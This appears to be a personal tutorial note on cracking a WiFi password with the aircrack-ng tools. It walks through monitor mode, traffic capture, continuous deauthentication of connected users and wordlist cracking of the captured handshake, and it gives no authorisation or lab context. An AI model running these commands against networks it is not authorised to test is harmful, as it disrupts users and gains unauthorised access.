### Set card to monitor mode
Before we begin, we need to check the status of our NIC card by typing the command 
```sh
iwconfig
```
We shall now switch our NIC to monitor mode using `airmon-ng` by typing the command shown in the screenshot below
![[Pasted image 20231213205344.png]]
We can monitor the traffic around us by using `airodump-ng` by running the following command
```sh
sudo airodump-ng wlan0mon
```
We are then able to view the different networks around us and devices conected to them, at this point we can choose the WiFi network we want to attack and perform our attack.
### Capturing traffic of our target network
We use `airodump-ng` to capture the traffic that is flowing in the network, to do this we need to get the BSSID of the network we intend to attack and the channel it operates on. To perform this we run the following command.
```sh
sudo airodump-ng -w <specify_the_name_of_the_file_where_the_traffic_will_be_stored> -c <specify_the_channel> -d <specify_bssid> wlan0mon
```
The results from this command shows the devices connected to the target network.
### Deauthentication
For us to get the WiFi handshake, we need to deauthenticate the users from the network by using `aireplay-ng` by running the following command
```sh
sudo aireplay-ng --deauth 0 -a <specify_bssid> wlan0mon
```
This command deauthenticates the user from the network, we can then go back to airodump-ng to look for the handshake as we try to connect to the network. 

```sh
sudo airodump-ng -w <specify_the_name_of_the_file_where_the_traffic_will_be_stored> -c <specify_the_channel> -d <specify_bssid> wlan0mon
```

Now that we have our handshake, we can crack the password using `aircrack-ng` by running the following command
```sh
sudo aircrack-ng <name_of_.cap_file> -w <select_wordlist_of_your_choice>
```

You should see the password of your WiFi if you use a good wordlist.